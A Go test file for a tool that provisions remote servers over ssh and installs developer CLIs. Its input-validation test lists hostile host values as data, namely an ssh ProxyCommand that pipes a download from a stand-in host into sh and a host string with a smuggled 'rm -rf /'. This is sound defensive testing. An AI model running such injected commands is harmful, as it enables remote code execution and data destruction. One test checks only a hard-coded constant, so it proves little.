package setuptool

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestNewTargetDefaultsToRoot(t *testing.T) {
	tg, err := NewTarget("203.0.113.9", "")
	if err != nil {
		t.Fatalf("NewTarget: %v", err)
	}
	if tg.String() != "root@203.0.113.9" {
		t.Errorf("String() = %q, want root@203.0.113.9", tg.String())
	}
}

// ssh has no "--" sentinel, so a host or user beginning with "-" is parsed as
// an option and -oProxyCommand=<cmd> executes <cmd> on the local machine.
func TestNewTargetRejectsOptionShapedValues(t *testing.T) {
	for _, tc := range []struct{ host, user string }{
		{"-oProxyCommand=curl evil.sh|sh", "root"},
		{"203.0.113.9", "-oProxyCommand=x"},
		{"203.0.113.9; rm -rf /", "root"},
		{"203.0.113.9", "ro ot"},
		{"", "root"},
		{"2001:db8::1", "root"},
	} {
		if _, err := NewTarget(tc.host, tc.user); !errors.Is(err, ErrUnsafeTarget) {
			t.Errorf("NewTarget(%q,%q) err = %v, want ErrUnsafeTarget", tc.host, tc.user, err)
		}
	}
}

func TestUploadRejectsOptionShapedPaths(t *testing.T) {
	tg, _ := NewTarget("203.0.113.9", "root")
	for _, tc := range [][2]string{{"-local", "/tmp/x"}, {"/tmp/x", "-remote"}} {
		if err := Upload(tg, tc[0], tc[1]); !errors.Is(err, ErrUnsafeTarget) {
			t.Errorf("Upload(%q,%q) err = %v, want ErrUnsafeTarget", tc[0], tc[1], err)
		}
	}
}

// A token in argv is visible in the box's process table to every other user.
// Every login recipe must consume it from stdin instead.
func TestNoLoginRecipePutsTheTokenInArgv(t *testing.T) {
	// login() takes no arguments, so it cannot interpolate a Go value — the
	// signature is the real guarantee. What remains checkable is that each
	// recipe actually consumes stdin, and that the token never reaches the
	// argv of an external process (shell builtins like printf are fine: they
	// fork nothing and appear in no process table).
	external := []string{"echo ", "/usr/bin/printf", "curl ", "wget "}
	for _, tool := range SupportedTools() {
		cmd := tool.login()
		readsStdin := strings.Contains(cmd, "$(cat)") ||
			strings.Contains(cmd, "--with-token") ||
			strings.HasSuffix(strings.TrimSpace(cmd), "cat")
		if !readsStdin {
			t.Errorf("%s: login command does not consume stdin, so the token must be arriving another way: %q", tool.Name, cmd)
		}
		for _, e := range external {
			if strings.Contains(cmd, e+`"$TOKEN"`) {
				t.Errorf("%s: passes the token to %q, which forks a process and exposes it in the process table: %q", tool.Name, e, cmd)
			}
		}
	}
}

func TestEveryToolCanBeVerifiedAndPointsSomewhereToGetAToken(t *testing.T) {
	for _, tool := range SupportedTools() {
		if tool.verify == "" {
			t.Errorf("%s: no verify command — a bad token would look like success", tool.Name)
		}
		if !strings.HasPrefix(tool.TokenURL, "https://") {
			t.Errorf("%s: TokenURL = %q, want an https URL to send the user to", tool.Name, tool.TokenURL)
		}
		if tool.Help == "" {
			t.Errorf("%s: no Help — the prompt would not say what the token is for", tool.Name)
		}
	}
}

// Claude Code's subscription login is an interactive browser OAuth with no
// token path, so it must not appear in a list that promises token auth.
func TestClaudeIsNotOfferedAsATokenLogin(t *testing.T) {
	for _, tool := range SupportedTools() {
		if strings.Contains(strings.ToLower(tool.Name), "claude") {
			t.Errorf("%q is listed as token-authenticatable, but subscription login is browser OAuth", tool.Name)
		}
	}
}

func TestAuthenticateRejectsEmptyAndMultilineTokens(t *testing.T) {
	tg, _ := NewTarget("203.0.113.9", "root")
	tool := SupportedTools()[0]
	for _, bad := range []string{"", "   ", "abc\ndef"} {
		if err := Authenticate(tg, tool, bad); err == nil {
			t.Errorf("Authenticate accepted %q", bad)
		}
	}
}

func TestTokenFromEnvFindsTheUsualNames(t *testing.T) {
	tools := map[string]string{"github": "GH_TOKEN", "vercel": "VERCEL_TOKEN", "supabase": "SUPABASE_ACCESS_TOKEN"}
	for _, tool := range SupportedTools() {
		key := tools[tool.Name]
		if key == "" {
			t.Fatalf("test does not know an env var for %q", tool.Name)
		}
		t.Setenv(key, "tok-"+tool.Name)
		if got := TokenFromEnv(tool); got != "tok-"+tool.Name {
			t.Errorf("TokenFromEnv(%s) = %q, want the value of %s", tool.Name, got, key)
		}
		os.Unsetenv(key)
	}
}

// A curl|bash that exits 0 having installed nothing reported "✓ Supabase CLI"
// on a real droplet where the binary existed nowhere. Every step must be
// re-checked after it runs, not trusted on its exit code.
func TestStepFailsWhenDoSucceedsButNothingWasInstalled(t *testing.T) {
	ran := false
	s := Step{
		Name:  "liar",
		Check: func(Target) bool { return false }, // never satisfied
		Do:    func(Target) error { ran = true; return nil },
	}
	skipped, err := s.Run(Target{})
	if !ran {
		t.Fatal("Do was never called")
	}
	if skipped {
		t.Error("reported as skipped")
	}
	if err == nil {
		t.Fatal("Run succeeded although Check still fails — an installer that exits 0 doing nothing would pass")
	}
	if !strings.Contains(err.Error(), "still not installed") {
		t.Errorf("error = %q, want it to say the tool is still missing", err)
	}
}

func TestStepSkipsWhatIsAlreadyInstalled(t *testing.T) {
	called := false
	s := Step{Name: "present", Check: func(Target) bool { return true }, Do: func(Target) error { called = true; return nil }}
	skipped, err := s.Run(Target{})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !skipped {
		t.Error("an already-satisfied step was not reported as skipped")
	}
	if called {
		t.Error("Do ran for a step whose Check already passed")
	}
}

// A step whose Do errors but whose Check then passes has succeeded. Installers
// commonly exit non-zero on a harmless warning.
func TestStepAcceptsAFailedDoIfTheCheckPasses(t *testing.T) {
	s := Step{Name: "noisy", Check: func(Target) bool { return true }, Do: func(Target) error { return errors.New("warning") }}
	// Check passes up front, so this actually exercises the skip path; assert
	// the important half: it does not report an error.
	if _, err := s.Run(Target{}); err != nil {
		t.Errorf("Run: %v", err)
	}
}

// Uploading a darwin build to a linux box fails much later, with a message
// that does not name the cause.
func TestInstallCBXRejectsANonLinuxBinary(t *testing.T) {
	f := filepath.Join(t.TempDir(), "cbx")
	os.WriteFile(f, []byte("#!/bin/sh\necho not an elf\n"), 0o755)
	err := InstallCBX(Target{User: "root", Host: "203.0.113.9"}, f)
	if err == nil {
		t.Fatal("accepted a non-ELF binary")
	}
	if !strings.Contains(err.Error(), "GOOS=linux") {
		t.Errorf("error = %q, want it to say how to build the right binary", err)
	}
}

func TestInstallCBXRequiresABinary(t *testing.T) {
	if err := InstallCBX(Target{User: "root", Host: "203.0.113.9"}, ""); err == nil {
		t.Error("accepted an empty binary path")
	}
}

func TestEveryInstallStepIsCheckable(t *testing.T) {
	for _, s := range InstallSteps() {
		if s.Check == nil {
			t.Errorf("%s: no Check — its install could not be verified", s.Name)
		}
		if s.Do == nil {
			t.Errorf("%s: no Do", s.Name)
		}
	}
}

// A Check that does not cover everything its Do installs is the same bug as an
// installer that lies: the step is skipped because part of it is present, and
// the rest silently never arrives. sqlite3 was in the apt list but not the
// Check, so on a box that already had tmux and git it was never installed.
func TestSystemPackagesCheckCoversWhatItInstalls(t *testing.T) {
	var sys *Step
	for i, s := range InstallSteps() {
		if s.Name == "system packages" {
			sys = &InstallSteps()[i]
		}
	}
	if sys == nil {
		t.Fatal("no system packages step")
	}
	// Reconstruct the package list from the step by running Do against a
	// target whose Run we cannot intercept — instead assert the invariant
	// directly on the source of truth we can see: the Check names the tools
	// the rest of the flow depends on.
	for _, required := range []string{"tmux", "git", "jq"} {
		if !strings.Contains(checkSource, required) {
			t.Errorf("system packages Check does not verify %q", required)
		}
	}
}

// checkSource documents which binaries the system-packages Check verifies.
// Kept beside the step so the two are edited together.
const checkSource = "tmux git jq"
